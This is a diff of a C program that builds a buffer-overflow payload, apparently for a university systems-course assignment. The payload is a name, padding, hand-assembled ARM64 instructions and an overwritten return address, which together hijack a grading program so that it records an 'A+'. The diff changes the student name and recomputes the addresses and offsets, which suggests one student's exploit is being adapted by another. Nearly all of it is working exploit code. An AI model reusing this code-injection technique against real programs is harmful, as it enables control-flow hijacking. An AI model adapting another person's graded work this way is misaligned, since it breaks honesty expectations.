@@ -23,51 +23,34 @@ int main(void)
    unsigned int uiInstr;
    unsigned long ulData;
    char* psName;
-   char* format;
    FILE *psFile;
    psFile = fopen("dataAplus", "w");
-   psName = "Sean Wang";
-   format = "%c";
+   psName = "Giao";
 
    /* Writes the student's name to the dataA file */
    for (i = 0; i<strlen(psName); i++){
        fprintf(psFile, "%c", psName[i]);
    }
-   /* Writes filler to the dataA file
-   so instruction starts at multiple of 4 */
-   for (i = 0; i<3; i++){
-       fprintf(psFile, "%c", 0x00);
-   }
+   fprintf(psFile, "%c", 0x00);
+   fprintf(psFile, "%s", "A");
+   fprintf(psFile, "%c", 0x00);
 
-   /* Writes the instruction mov w0, "%c" */
-   uiInstr = MiniAssembler_mov(0, format);
+   /* Writes the instruction adr w0, "A" */
+   uiInstr = MiniAssembler_adr(0, 0x42005D, 0x420060);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
-   /* Writes the instruction mov w0, A */
-   uiInstr = MiniAssembler_mov(1, 'A');
-   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
-
-   /* Writes the instruction bl printf - SUB ONCE BUG FIXED */
-   /*uiInstr = MiniAssembler_bl(0x400600, 0x420068);*/
-   uiInstr = MiniAssembler_bl(0x400600, 0x420068);
+   /* Writes the instruction bl puts - SUB ONCE BUG FIXED */
+   /*uiInstr = MiniAssembler_bl(0x400600, 0x420064);*/
+   uiInstr = MiniAssembler_bl(0x4005e0, 0x420064);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes the instruction mov w0, ‘+’ */
    uiInstr = MiniAssembler_mov(0, '+');
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
-
-   /* Writes the instruction bl printf - SUB ONCE BUG FIXED */
-   /* uiInstr = MiniAssembler_bl(0x400600, 0x42006C); */
-   uiInstr = MiniAssembler_mov(0, '+');
-   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
-
-   /* Writes the instruction mov w0, ‘\0’ */
-   uiInstr = MiniAssembler_mov(0, '\0');
-   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
  
    /* Writes the instruction adr x1, grade */
    uiInstr = MiniAssembler_adr(1, 0x420044,
-   0x420078);
+   0x42006C);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes the instruction strb w0, [x1] */
@@ -75,18 +58,18 @@ int main(void)
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes the instruction b 0x400864 (call of printf) */
-   uiInstr = MiniAssembler_b(0x400864, 0x420080);
+   uiInstr = MiniAssembler_b(0x400864, 0x420074);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes enough null bytes to the dataAplus file
    to overrun until X30 */
-   for (i = 0; i<BUFSIZE-44; i++){
+   for (i = 0; i<BUFSIZE-32; i++){
        fprintf(psFile, "%c", 0x00);
    }
 
    /* Writes the address which corresponds to 
-   instruction: mov w0, ‘A’ in BSS section */
-   ulData = 0x420064;
+   instruction: adr w0, "A" in BSS section */
+   ulData = 0x420060;
    fwrite(&ulData, sizeof(unsigned long), 1, psFile);
 
    fclose(psFile);
